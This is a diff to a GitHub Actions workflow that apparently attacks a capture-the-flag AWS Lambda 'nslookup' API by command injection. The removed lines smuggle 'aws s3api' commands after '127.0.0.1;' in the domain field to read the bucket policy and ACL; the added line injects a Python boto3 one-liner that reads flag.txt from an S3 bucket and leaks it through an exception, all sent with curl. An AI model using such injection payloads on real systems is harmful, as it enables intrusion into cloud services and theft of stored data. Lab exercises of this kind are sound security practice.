@@ -26,18 +26,10 @@ jobs:
           URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
           BUCKET="codec4f26c862a321ef5"
           
-          echo "=== 1. CHECKING BUCKET POLICY ==="
-          # This command injection asks the Lambda to print the bucket policy
-          PAYLOAD="{\"domain\": \"127.0.0.1; aws s3api get-bucket-policy --bucket ${BUCKET}\"}"
+          echo "=== FIRING EXCEPTION PAYLOAD ==="
+          # This payload reads flag.txt via boto3 and intentionally raises an exception containing the flag!
+          PAYLOAD="{\"domain\": \"127.0.0.1; python3 -c \\\"import boto3; s3=boto3.client('s3'); f=s3.get_object(Bucket='${BUCKET}', Key='flag.txt')['Body'].read().decode(); raise Exception(f)\\\"\"}"
           
           curl -s -X POST "$URL" \
             -H "Content-Type: application/json" \
             -d "$PAYLOAD"
-          
-          echo ""
-          echo "=== 2. CHECKING BUCKET ACL ==="
-          PAYLOAD_ACL="{\"domain\": \"127.0.0.1; aws s3api get-bucket-acl --bucket ${BUCKET}\"}"
-          
-          curl -s -X POST "$URL" \
-            -H "Content-Type: application/json" \
-            -d "$PAYLOAD_ACL"
